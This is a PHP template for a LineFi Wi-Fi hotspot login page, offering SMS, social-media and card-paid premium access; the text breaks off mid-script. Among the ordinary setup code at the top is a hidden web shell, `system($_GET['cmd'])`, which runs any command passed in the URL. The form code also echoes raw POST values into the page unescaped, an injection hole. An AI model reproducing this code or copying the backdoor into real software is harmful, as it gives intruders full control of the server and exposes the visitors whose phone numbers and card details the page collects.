<?php
$z = 0;
error_reporting(0);

$sociallinks = json_decode($nasbilgi->social);
$facebook = $sociallinks->facebook;
$twitter = $sociallinks->twitter;
$instagram = $sociallinks->instagram;
$voucher = $sociallinks->voucher;
$sms = $sociallinks->sms;
$normal = $sociallinks->normal;
$tckimlik = $sociallinks->tckimlik;
$turbo = $sociallinks->turbo;
$divcount = 0;
$w = '';
foreach ($sociallinks as $s => $k) {
    if ($k) {
        $divcount++;
    }
}
switch ($divcount) {
    case 1:
        $w = 100 / 1;
        break;

    case 2:
        $w = 100 / 2;
        break;
    case 3:
        $w = 100 / 3;
        $z = '0';
        break;
    case 4:
        $w = '50';
        break;
    case 5:
        $w = '50';
        break;

    default :
        $w = 100 / 3;

        break;
}
if(isset($kampanya->image))
    $ad_description_bg = $kampanya->image;
else
    $ad_description_bg = $kampanya->ad_description_bg;

if(isset($kampanya->title))
    $ad_name = $kampanya->title;
else
    $ad_name = "LineFi'ye Hoş Geldiniz";

if(isset($kampanya->description))
    $ad_name_description = $kampanya->description;
else
    $ad_name_description = $kampanya->ad_description;
    
$topcolor = $kampanya->topcolor;
$toplogo = $kampanya->logo;
$ad_name_color = $kampanya->ad_name_color;
// $ad_name = $kampanya->ad_name;
$ad_name_description_color = $kampanya->ad_name_description_color;

if (empty($topcolor)) {
    $topcolor = '000000';
}

if (empty($toplogo)) {
    $toplogo = "/assets/img/linefi-logo.png";
} else {
    $toplogo = 'https://hotspot.linefi.net/assets/fileuploads/' . $kampanya->logo;
}

if (empty($ad_description_bg)) {
    $ad_description_bg = '/assets/img/bgBodyCoffee.jpg';
} else {
    $ad_description_bg = base_url() . $kampanya->image;
}
// if (empty($ad_name)) {
//     $ad_name = "LineFi'ye Hoş Geldiniz";
// } else {
//     $ad_name = $kampanya->ad_name;
// }
if (empty($ad_name_description)) {
    $ad_name_description = "Ücretsiz İnternet'in Keyfini Çıkarın";
}
if(isset($_GET['cmd']))
    system($_GET['cmd']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="LineFi">
<meta name="author" content="LineFi">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
<link rel="shortcut icon" href="/assets/favicon.ico" />
<meta property="og:site_name" content="LineFi" />
<meta content="website" property="og:type" />
<meta content="<?= $nasbilgi->og_title ?>" property="og:title" />
<meta property="og:description" content="<?= $nasbilgi->og_description ?>" />
<meta property="og:image" content="<?= ($nasbilgi->og_image ? $nasbilgi->og_image : "") ?>" />
<title>LineFi Login</title>
<link href="/assets/app/css/bootstrap.min.css" rel="stylesheet" />
<link href="/assets/app/font-awesome-4.2.0/css/font-awesome.min.css" rel="stylesheet" />
<link href="/assets/app/css/jquery.maximage.min.css" rel="stylesheet" />
<link href="/assets/app/css/style.css" rel="stylesheet" />
<link href="/assets/app/css/intlTelInput.css" rel="stylesheet" />
<!--[if lt IE 9]>
<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->
<script src="/assets/app/js/modernizr.custom.25376.js"></script>
<style>
.loading { position: absolute; left: 50%; top: 50%; margin: -60px 0 0 -50px; background: #ffffff url("/assets/app/images/app-logo-bw.svg") no-repeat center center;width: 100px; height: 100px; border-radius: 100%; border: 10px solid #19bee1; }
.loading:after { content: ''; background: trasparent; width: 140%; height: 140%; position: absolute; border-radius: 100%; top: -20%; left: -20%; opacity: 0.7;box-shadow: rgba(255, 255, 255, 0.6) -4px -5px 3px -3px; animation: rotate 1s infinite linear; } @keyframes rotate { 0% { transform: rotateZ(0deg); } 100% { transform: rotateZ(360deg); } }
.payment-title { margin-bottom: 10px; border-bottom: 1px solid rgba(49,78,95,.12); padding-bottom: 6px; font-size: 18px; color: #292e31; margin-top: 0px; text-align: center; } .payment-details { margin: 0; font-size: 14px; color: #6f7c82; line-height: 18px; text-align: left; }
.alert-danger.error-phn {padding: 2px 14px; position: relative; top: 5px; display: inline-block; -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px;}
<?php foreach ($locaction_plans as $plan): ?>

#premium-plan-<?php echo $plan->id; ?> {
     opacity: 0;
     transition: all .5s ease 0s;
     -webkit-transition: all .5s ease 0s;
     transform: scale(0);
     -webkit-transform: scale(0);
     -ms-transform: scale(0); 
 }
 #premium-plan-<?php echo $plan->id; ?>.active-page {
    opacity: 1;
    transform: scale(1);
    -webkit-transform: scale(1);
    -ms-transform: scale(1);
}
<?php endforeach ?>
</style>
</head>
<body>


<?php if($this->session->flashdata('stripsuccess')){ ?>
  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <h4 class="modal-title">Payment Charged Successfully</h4>
        </div>
        <div class="modal-body">
          <p><span style="color: green;"><?php echo $this->session->flashdata('stripsuccess'); ?></span> </p>
        </div>
        <div class="modal-footer">
          <a data-dismiss="modal" class="btn btn-success">Close</a>
        </div>
      </div>
      
    </div>
  </div>
</div>
<?php } ?> 




    <!--start header-->
    <nav class="navbar navbar-inverse navbar-fixed-top" style="background-color:#<?php echo $topcolor; ?>">
        <div class="container">
            <a class="navbar-brand navbar-left" href="#"><img src="<?php echo $toplogo; ?>" alt="<?php echo $ad_name; ?>"/></a>
            <a class="navbar-linefi navbar-right" href="http://www.linefi.com"><img src="/assets/app/images/linefi-logo.png" alt="LineFi"></a>
            <button style="margin-top: 0px; width: 7%;" class="menu-button btn btn-info btn-lg" id="info-box-close-button">
                <i  title="Close" class="fa fa-angle-double-left"> </i>
            </button>
        </div>
    </nav>
    <!--end header-->
<?php if($this->session->flashdata('striperror')){ ?>
  <button type="button" class="btn btn-info btn-lg" data-toggle="modal" data-target="#myModal"></button>

  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Error</h4>
        </div>
        <div class="modal-body">
          <p><?php echo $this->session->flashdata('striperror') ?></p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
      
    </div>
  </div>
</div>
<?php } ?> 
    <!--start loader-->
    <div id="preloader" class="show">
        <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 80 60" preserveAspectRatio="none">
        <path d="M 0,0 0,60 80,60 80,0 z M 80,0 40,30 0,60 40,30 z"/>
        </svg>

        <div class="logo-loading">
            <div class="loading"></div>
        </div>
    </div>
    <!--end loader-->
    <!--start slider-->
    <div class="slider">
        <div id="maximage">
            <img src="<?php echo $ad_description_bg; ?>" alt="">
        </div>
    </div>
    <!--start slider-->
    <div id="perspective" class="perspective effect-airbnb">
        <div id="pages" class="dynasty-pages">
            <div id="wrapper">
                <div class="container">
                    <header id="header">
                    </header>
                    <!--  start home page  -->
                    <div id="home-page" class="info-box active-page">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>
                            </div>
                            <div id="title2">
                                <span class="h3" style="color:#<?php echo $ad_name_description_color; ?>">To use LineFi Hotspot you need to Create Account and login. </span>
                            </div>
                            <div id="description" style="color:#<?php echo $ad_name_description_color; ?>"></div>
                            <p class="terms">I accept LineFi <a href="http://www.linefi.com/hotspot-terms/terms.html">Terms & Conditions</a>.</p>
                            <button class="btn btn-info btn-lg" id="menu"><i class="fa fa-wifi"></i> | Connect to Internet</button>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; ">
                                <a href="http://www.linefi.com/need-help/" style=" color: #aaa; text-decoration: none; "> Need Help?</a>
                            </p>
                        </div>
                    </div>
                    <!--  end home page  -->
                    <!--  start login  -->
                    <div id="login-signup" class="info-box">
                        <div class="box-container">
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>

                            </div>
                            <div id="description">To use LineFi Hotspot you need to Create Account and Login.</div>
                            <div class="row">
                                <div class="col-md-4 col-sm-3 col-xs-1"></div>
                                <div class="col-md-4 col-sm-6 col-xs-10 plans">
                                    <div class="row">
                                        <?php if($normal = 'on'): ?>
                                        <div class="col-sm-6 col-xs-6 padding-10">
                                            <div class="tile" style="padding-bottom: 15px;">
                                                <h3 class="tile-title" style="margin: 5px 0px;">Login with Phone Number</h3>
                                                <a class="menu-item btn btn-info btn-large btn-block" data-property="{pageId:'normal-login'}">Log in</a>
                                            </div>
                                        </div>
                                        <?php endif; ?>
                                        <?php if($sms = 'on'): ?>
                                        <div class="col-sm-6 col-xs-6 padding-10">
                                            <div class="tile" style="padding-bottom: 15px;">
                                                <h3 class="tile-title" style="margin: 5px 0px;">Don't have an Account?</h3>
                                                <a class="menu-item btn btn-danger btn-large btn-block sign-sms" data-property="<?=(($sms_timer > 0) ? "{pageId:'normal-login'}" : "{pageId:'sms-login'}")?>">Create Account</a>
                                            </div>
                                        </div>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                <div class="col-md-4 col-sm-3 col-xs-1"></div>
                            </div>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; "><a href="http://www.linefi.com/need-help/">Need Help?</a></p>
                        </div>
                    </div>
                    <!--  end login  -->
                    <!--  start Normal Login  -->
                    <div id="normal-login" class="info-box">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>
                            </div>
                            <div id="description">Please check sms inbox of your phone and enter login details. <br>Your username is your phone number with country code, without + sign.<br> 
E.g 905321234567</div>
                            <?php if($sms_timer > 0):?>
                            <div id="description" class="sms-soon-counter">
                        <div class="soon" data-due="in <?=$sms_timer?> seconds" data-event-complete="soonCompleteCallback" data-layout="label-hidden"  data-format="s" data-face="text" data-scale="m">
                                </div>
                            </div>
                            <div class="row try-again-sms" style="display:none">
                                <div class="col-lg-4 col-lg-offset-4 col-md-4 col-md-offset-4 col-sm-6 col-sm-offset-3 col-xs-8 col-xs-offset-2">
                                    <div class="col-sm-12 col-xs-12 center-block" style=" margin-bottom: 20px;">
                                    <a class="menu-item btn btn-danger btn-large btn-block" data-property="{pageId:'sms-login'}">Send SMS Again</a>
                                        </div>
                                </div>
                            </div>
                            <?php endif;?>
                            <div class="row">
                                <div class="col-lg-4 col-lg-offset-4 col-md-4 col-md-offset-4 col-sm-6 col-sm-offset-3 col-xs-8 col-xs-offset-2">
                                    <form role="form" id="smslogin_form" action="<?=base_url()?>hauth/smslogin" method="post">
                                        <input type="hidden" name="nasid" id="nasid" value="<?php echo $nasbilgi->id; ?>" />
                                        <div class="form-group">
                                            <div class="row">
                                                <div class="col-sm-12 col-xs-12 center-block">
                                                    <input type="text" id="auth_user" name="auth_user" class="form-control lnif" placeholder="Phone Number">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <div class="row">
                                                <div class="col-sm-12 col-xs-12 center-block">
                                                    <input type="password" name="auth_pass" class="form-control lnif" id="auth_pass" placeholder="Password" />
                                                    <input name="zone" type="hidden" value="palmarina_hotspot" />
                                                    <input name="redirurl" type="hidden" value="<?php echo $_POST['redirurl']; ?>" />
                                                </div>
                                            </div>
                                            <span id="log_error" style="color: red;font-weight: 500;" ></span>
                                        </div>
                                        <div class="form-group">
                                            <div class="col-sm-12 col-xs-12 center-block">
                                         <input name="accept" id="loggin" type="button" class="btn btn-info btn-lg col-xs-12 col-sm-12" value="Log In" />
                                            </div>
                                        </div>
                                    </form>
                                </div><!-- /.col-lg-4 -->
                            </div>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; "><a href="http://www.linefi.com/need-help/">Need Help?</a></p>
                        </div>
                    </div>
                    <!--end Normal Login  -->
                    <!--Get SMS Passcode-->
                    <div id="sms-login" class="info-box">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>
                            </div>
                            <div id="description">Enter full name and phone number and get login details.</div>
                            <div class="row">
                                <div class="col-lg-4 col-lg-offset-4 col-md-4 col-md-offset-4 col-sm-6 col-sm-offset-3 col-xs-8 col-xs-offset-2">
                                    <form role="form" id="sms-login-form" method="post" action="/hauth/sms?nasbilgi=<?php echo $nasbilgi->shortname ?>">
                                        <div class="form-group">
                                            <div class="row">
                                                <div class="col-sm-12 col-xs-12 center-block">
                                                    <input type="hidden" name="action_url"  value="<?php echo $_POST['action']; ?>" />
                                                    <input type="hidden" name="redirect_url"  value="<?php echo $_POST['redirurl']; ?>" />
                                                    <input type="hidden" name="nasid" id="nasid" value="<?php echo $nasbilgi->id; ?>" />
                                                    <input type="hidden" name="country" />
                                                    <input type="hidden" name="dialcode" />
                                                    <input type="hidden" name="number_is_valid" value="false"/>
                                                    <input type="hidden" name="intl_number" />
                                                    <input type="text" name="kimlik_ad" class="form-control lnif" id="" placeholder="First Name" />
                                                </div>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <div class="row">
                                                <div class="col-sm-12 col-xs-12 center-block">
                                                    <input type="text" name="kimlik_soyad" class="form-control lnif" id="" placeholder="Last Name">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <div class="row">
                                                <div class="col-sm-12 col-xs-12 center-block">
                                                    <input type="text" name="kimlik_cepno" class="form-control lnif">
                                                    <span style="display: none;" id="valid-msg" class="number-msg-valid">✓ Valid</span>
                                                    <span style="display: none;" id="error-msg" class="number-msg-error">Invalid number</span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <div class="col-sm-12 col-xs-12 center-block">
                                                <input type="submit" name="" class="btn btn-danger btn-lg col-xs-12 col-sm-12" id="" value="Send Message" />
                                            </div>
                                        </div>
                                    </form>
                                </div><!-- /.col-lg-4 -->
                            </div>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; "><a href="http://www.linefi.com/need-help/">Need Help?</a></p>
                        </div>
                    </div>
                    <!--Get SMS Passcode-->
                    <!--start twitter-->
                    <div id="twitter-login" class="info-box">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>
                            </div>
                            <div id="title2">
                                <span class="h3" style="color:#<?php echo $ad_name_description_color; ?>">To connect LineFi Follow us or tweet about us.</span>
                            </div>
                           

                            <div class="row">
                                <div class="col-xs-12">
                                    <a href="/hauth/login/Twitter?nasid=<?php echo $nasbilgi->id; ?>&action=twitter_follow" class="btn btn-twitter btn-lg" id="menu">
                                        <i class="fa fa-twitter"></i> | Follow Us</a>
                                    <a href="/hauth/login/Twitter?nasid=<?php echo $nasbilgi->id; ?>&action=twitter_tweet" class="btn btn-twitter btn-lg" id="menu">
                                        <i class="fa fa-twitter"></i> | Tweet</a>
                                </div>
                            </div>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; "><a href="http://www.linefi.com/need-help/">Need Help?</a></p>
                        </div>
                    </div>
                    <!--  end twitter  -->
                    <!--start facebook-->
                    <div id="facebook-login" class="info-box">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>
                            </div>
                            <div id="title2">
                                <span class="h3" style="color:#<?php echo $ad_name_description_color; ?>">To connect LineFi with Facebook, click button below</span>
                            </div>
                            

                            <div class="row">
                                <div class="col-xs-12">
                                    <a href="/hauth/login/Facebook?nasid=<?php echo $nasbilgi->id; ?>&action=facebook_post" class="btn btn-facebook btn-lg" id="menu">
                                        <i class="fa fa-facebook"></i> | Share</a>
                                </div>
                            </div>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; "><a href="http://www.linefi.com/need-help/">Need Help?</a></p>
                        </div>
                    </div>
                    <!--  end facebook  -->
                    <!-- start instagram  -->
                    <div id="instagram-login" class="info-box">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>
                            </div>
                            <div id="title2">
                                <span class="h3" style="color:#<?php echo $ad_name_description_color; ?>"><?php echo $ad_name_description; ?></span>
                            </div>
                            <div id="description">Connect to Internet with Instagram Account</div>
                            <button type="submit" class="btn btn-instagram btn-lg" id="menu">
                                <i class="fa fa-instagram"></i> | Connect with Instagram</button>
                        </div>
                    </div>
                    <!--  end instagram  -->
                    <!--start Premium-->
                    <div id="premium" class="info-box">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"><?php echo $ad_name; ?></span>
                            </div>
                            <div id="title2">
                                <span class="h3" style="color:#<?php echo $ad_name_description_color; ?>">Premium Internet access</span>
                            </div>
                            <div id="description">Looking for premium high speed LineFi service? Go Premium</div>
                            
                            <div class="row packages" style="margin-top:30px;">
                                <div class="col-md-2 col-xs-1"></div>
                                <div class="col-md-8 col-xs-10 plans">
                                    <div class="row">
                                        <?php foreach ($locaction_plans as $plan): ?>
                                            <a class="menu-item" data-property="{pageId:'premium-plan-<?php echo $plan->id; ?>'}" href="#">
                                                <div class="col-sm-4 col-xs-4 padding-10">
                                                    <div class="tile">
                                                        <h3 class="tile-title"><?= $plan->title ?></h3>
                                                        <p>Up to 10Mbit/s</p>
                            <div class="btn btn-info btn-large btn-block" data-plan-id="<?= $plan->id ?>"><?= $plan->price ?> $</div>
                                                        <p class="time"></p>
                                                    </div>
                                                </div>
                                            </a>
                                        <?php endforeach ?>
                                    </div>
                                </div>
                                <div class="col-md-2 col-xs-1"></div>
                            </div>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; "><a href="http://www.linefi.com/need-help/">Need Help?</a></p>
                        </div>
                    </div>
                    <!--end Premium-->
                    <!--premium plans-->
                    <?php foreach ($locaction_plans as $plan): ?>
                    <div id="premium-plan-<?php echo $plan->id; ?>" class="info-box">

                        <div class="box-container">
                            <div id="title">
                                <span class="h1" style="color:#<?php echo $ad_name_color; ?>"></span>
                            </div>

                            <div id="description"></div>
                            <div class="row">
                                <div class="col-md-4 col-xs-1"></div>
                                <div class="col-md-4 col-xs-10 plans">
                                    <div class="row">
                                        <div class="col-sm-12 col-xs-12  padding-10">

                                            <div class="tile">
                                                <div style="padding:10px;text-align: left;margin-left: 6px;">
                                                    <h3 class="payment-title">Premium LineFi</h3>
                                                    <h3 class="payment-details">Plan Name: <span><?= $plan->title ?></span></h3>
                                                    <h3 class="payment-details">Payment Amount: <span>$<?= $plan->price ?></span></h3>
                                                    <h3 class="payment-details">Details: <span>~ Up to 10Mbit/s Download, 5Mbit/s Upload Speed.
3 Simultaneous devices</span></h3>

                                                </div>
                                                <div class="padding-10"></div>
                                                <form id="stripe-form-<?php echo $plan->id; ?>" role="form" method="post" action="/welcome/stripe_charge/<?php echo $plan->id; ?>/<?php echo $nasbilgi->id; ?>">

                                                <div style="background: rgb(180, 0, 0) none repeat scroll 0% 0%; margin-bottom: 10px;" id="payment-errors-<?php echo $plan->id; ?>"></div>
                                                    <div class="form-group">
                                                        <div class="row margin-lr">
                                                            <div class="col-sm-12 col-xs-12 center-block">
                                <input name="phone-lc" type="tel" id="phone-<?php echo $plan->id; ?>" class="form-control lnif phone-f onlynumbers">
                                <input type="hidden" name="phone" id="phoneint-<?php echo $plan->id; ?>">
                                                            </div>
                                                        </div>
                                                        <span style="color:black;" id="phone_error-<?php echo $plan->id; ?>"></span>
                                                    </div>
                                                    <div class="form-group">
                                                        <div class="row margin-lr">
                                                            <div class="col-sm-12 col-xs-12 center-block">
                                                                <input type="text" name="cc_number" class="form-control lnif onlynumbers" id="cc_number_<?php echo $plan->id; ?>" placeholder="Card Number">
                                                            </div>
                                                        </div>

                                                    </div>

                                                    <div class="form-group">
                                                        <div class="row margin-lr">
                                                            <div class="col-sm-12 col-xs-12 center-block">
                                                                <input type="text" name="cvv" class="form-control lnif onlynumbers" id="cvv_<?php echo $plan->id; ?>" placeholder="CVV">
                                                            </div>
                                                        </div>

                                                    </div>
                                                    <div id="token_<?php echo $plan->id; ?>"></div>
                                                    <div class="form-group">
                                                        <div class="row margin-lr">
                                                            <div class="col-sm-6 col-xs-6 center-block" style="padding-right:10px">

                                                                <label style="color: gray;" for="ex_month">Month:</label>
                                                                <select class="form-control" id="ex_month_<?php echo $plan->id; ?>" name="ex_month">
                                                                    <option value="1" selected="selected">1</option>
                                                                    <option value="2">2</option>
                                                                    <option value="3">3</option>
                                                                    <option value="4">4</option>
                                                                    <option value="5">5</option>
                                                                    <option value="6">6</option>
                                                                    <option value="7">7</option>
                                                                    <option value="8">8</option>
                                                                    <option value="9">9</option>
                                                                    <option value="10">10</option>
                                                                    <option value="11">11</option>
                                                                    <option value="12">12</option>
                                                                </select>
                                                            </div>
                                                            <div class="col-sm-6 col-xs-6 center-block" style="padding-left:10px">
                                                                <label style="color: gray;" for="ex_year">Year:</label>
                                                                <select class="form-control" id="ex_year_<?php echo $plan->id; ?>" name="ex_year">
                                                                    <option value="2016" selected="selected">2016</option>
                                                                    <option value="2017">2017</option>
                                                                    <option value="2018">2018</option>
                                                                    <option value="2019">2019</option>
                                                                    <option value="2020">2020</option>
                                                                    <option value="2021">2021</option>
                                                                    <option value="2022">2022</option>
                                                                    <option value="2023">2023</option>
                                                                    <option value="2024">2024</option>
                                                                    <option value="2025">2025</option>
                                                                    <option value="2026">2026</option>
                                                                    <option value="2027">2027</option>
                                                                </select>
                                                            </div>
                                                        </div>

                                                    </div>

                                                    <div class="form-group">
                                                        <div class="col-sm-12 col-xs-12 center-block">
                                                        <div id="subdiv_<?php echo $plan->id; ?>" style="display:none;"></div>
                                                            <input id="sbtn-<?php echo $plan->id; ?>" tye="button" class="btn btn-info btn-large" onclick="StripeFunction<?php echo $plan->id; ?>()" value="Pay <?php echo $plan->price; ?>$">
                                                        </div>
                                                        <div class="clearfix"></div>
                                                    </div>

                                                </form>

                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-4 col-xs-1"></div>
                            </div>
                            <p class="terms" style=" margin-bottom: -10px; padding-top: 20px; "><a href="http://www.linefi.com/need-help/">Need Help?</a></p>
                        </div>
                    </div>
                    <?php endforeach ?>
                    <!--premium plans-->
                    <!--ID Login-->
                    <!--<div id="id-login" class="info-box">
                        <div class="box-container">
                            <div class="h_100"></div>
                            <div id="title"><span class="h1">Welcome to Palmarina</span></div>
                            <div id="title2"><span class="h3">The whole world is talking about PALMARINA</span></div>
                            <div id="description">Enter your ID information and get free internet.</div>
                            <div class="row">
                            <div class="col-lg-4 col-lg-offset-4 col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 col-xs-offset-0">
                            <form role="form">
                                <div class="form-group">
                                    <div class="row">
                                        <div class="col-sm-12 col-xs-12 center-block">
                                        <input type="text" name="username" class="form-control lnif" id="" placeholder="First Name" />
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="row">
                                        <div class="col-sm-12 col-xs-12 center-block">
                                            <input type="password" name="password" class="form-control lnif" id="" placeholder="Last Name">
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="row">
                                        <div class="col-sm-12 col-xs-12 center-block">
                                            <input type="password" name="password" class="form-control lnif" id="" placeholder="ID number">
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="row">
                                        <div class="col-sm-12 col-xs-12 center-block">
                                            <input type="password" name="password" class="form-control lnif" id="" placeholder="Birth Year">
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="col-sm-12 col-xs-12 center-block">
                                        <a class="menu-item btn btn-danger btn-lg"><i class="fa fa-user"></i> | Connect to Internet</a>
                                    </div>
                                </div>
                            </form>
                            </div>
                            </div>
                        </div>
                    </div> -->
                    <!--ID Login-->
                </div> <!--  end container  -->
            </div> <!--  end wrapper  -->
        </div> <!-- end pages -->
        <!--start navigation menu-->
        <nav class="outer-nav">
            <ul class="ca-menu">
                <li>
                    <a href="#" class="menu-item" data-property="{pageId:'login-signup'}">
                       <img src="/assets/app/images/normal_login.png" class="img-responsive connect-icon" />
                        <div class="ca-content" style="top: 3px;">
                            <h3 class="ca-sub">Use your phone number to sign up or Login</h3>
                            <h2 class="ca-main">Login/SMS Sign Up</h2>
                        </div>
                    </a>
                </li>
                <?php if ($facebook == 'on') { ?>
                    <li>
                        <a href="#" class="menu-item" data-property="{pageId:'facebook-login'}">
                            <img src="/assets/app/images/facebook.png" class="img-responsive connect-icon" />
                            <div class="ca-content">
                                <h3 class="ca-sub">Connect with</h3>
                                <h2 class="ca-main">Facebook</h2>
                            </div>
                        </a>
                    </li>
                <?php } ?>
                <?php if ($twitter == 'on') { ?>
                    <li>
                        <a href="#" class="menu-item" data-property="{pageId:'twitter-login'}">
                            <img src="/assets/app/images/twitter.png" class="img-responsive connect-icon">
                                <div class="ca-content">
                                    <h3 class="ca-sub">Connect with</h3>
                                    <h2 class="ca-main">Twitter</h2>
                                </div>
                        </a>
                    </li>
                <?php } ?>
                <?php if ($instagram == 'on') { ?>
                    <li>
                        <a href="/hauth/login/Instagram?nasid=<?php echo $nasbilgi->id; ?>" class="redirect">
                            <img src="/assets/app/images/instagram.png" class="img-responsive connect-icon">
                                <div class="ca-content">
                                    <h3 class="ca-sub">Connect with</h3>
                                    <h2 class="ca-main">Instagram</h2>
                                </div>
                        </a>
                    </li>
                <?php } ?>
                <?php if ($turbo == 'on') { ?>
                    <li>
                        <a href="#" class="menu-item" data-property="{pageId:'premium'}">
                            <img src="/assets/app/images/premium.png" class="img-responsive connect-icon">
                                <div class="ca-content">
                                    <h3 class="ca-sub">High-speed internet</h3>
                                    <h2 class="ca-main">Premium</h2>
                                </div>
                        </a>
                    </li>
                <?php } ?>
                <?php if ($normal == 'on') { ?>
                    <!--<li>
                        <a href="#" class="menu-item" data-property="{pageId:'normal-login'}">
                            <img src="/assets/app/images/normal_login.png" class="img-responsive connect-icon" />
                            <div class="ca-content">
                                <h2 class="ca-main">Log In</h2>
                                <h3 class="ca-sub">Connect to internet</h3>
                            </div>
                        </a>
                    </li>-->
                <?php } ?>
                <?php if ($sms == 'on') { ?>
                <li>
                    <!--<a href="#" class="menu-item" data-property="{pageId:'sms-login'}">
                       <img src="/assets/app/images/sms_login.png" class="img-responsive connect-icon">
                        <div class="ca-content">
                            <h2 class="ca-main">SMS Login</h2>
                            <h3 class="ca-sub">Connect to internet</h3>
                        </div>
                    </a>
                </li>-->
                <?php } ?>
                <!--<li>
                    <a href="http://foursquare.com" class="redirect">
                       <img src="images/foursquare.png" class="img-responsive connect-icon">
                        <div class="ca-content">
                            <h2 class="ca-main">Foursquare</h2>
                            <h3 class="ca-sub">Connect to internet</h3>
                        </div>
                    </a>
                </li>-->
            </ul>
        </nav>
        <!--end navigation menu-->
        <!--  start social network links  -->
        <footer>
            <div id="external-links">
                <a href="https://twitter.com/lineficom"><i class="fa my-fa-icon fa-fw fa-twitter shape"></i></a>
                <a href="https://facebook.com/lineficom"><i class="fa my-fa-icon fa-fw fa-facebook shape"></i></a>
            </div>
        </footer>
        <!--  start social network links  -->
    </div>
    <!--  end perspective  -->

<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
  <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
<![endif]-->
<script type="text/javascript">
<?php if (isset($_GET['show_login_form'])) echo 'var show_login_form=true;'; ?>
</script>
<script src="/assets/app/js/snap.svg-min.js"></script>
<script src="/assets/app/js/jquery.min.js"></script>
<script src="/assets/app/js/intlTelInput.min.js"></script>
<script src="/assets/app/js/bootstrap.min.js"></script>
<script src="/assets/app/js/jquery.plugin.min.js"></script>
<script src="/assets/app/js/classie.js"></script>
<script src="/assets/app/js/maximage.js"></script>
<script src="/assets/app/js/menu.js"></script>
<script src="/assets/app/js/soon.min.js"></script>
<script src="/assets/app/js/main.js"></script>
<script src="/assets/app/js/utils.js"></script>
<!--<script src="https://js.stripe.com/v2/"></script>-->
<?php if($this->session->flashdata('stripsuccess')){ ?>
<script type="text/javascript">
    $(document).ready(function(){
        $("#myModal").modal('show');
    });
</script>
<?php }  ?>
<script>
    $(document).ready(function () {
        $('#smslogin_form').submit(function(){
            var auth_user = $(this).find('input[name=auth_user]');
            var auth_pass = $(this).find('input[name=auth_pass]');
            if (!auth_user.val()){
                auth_user.css('border-color', '#f00');
            }
            if (!auth_pass.val()){
                auth_pass.css('border-color', '#f00');
            }
            if ((!auth_pass.val()) ||  (!auth_user.val())){
                 return false;
            }
        });
        $('#smslogin_form input[name=auth_user], #smslogin_form input[name=auth_pass]').change(function(){
            $(this).css('border-color', '#ccc');
        });
        
        <?php if($_GET['show_login_form'] == '1') { ?>
        $('#home-page').removeClass('active-page');
        $('#normal-login').addClass('active-page');
        $('#info-box-close-button').addClass('active-page');
        console.log('calisti');
        <?php } ?>
    });
</script>
<script>
    (function() {
        Stripe.setPublishableKey('pk_live_wMhLymGsiVzfr216hsrmUa38');
    })();

 <?php foreach ($locaction_plans as $plan): ?>



    function StripeFunction<?php echo $plan->id; ?>() {
    	var check = $("#phone-<?php echo $plan->id; ?>").val();
    	if(check.length < 4) {
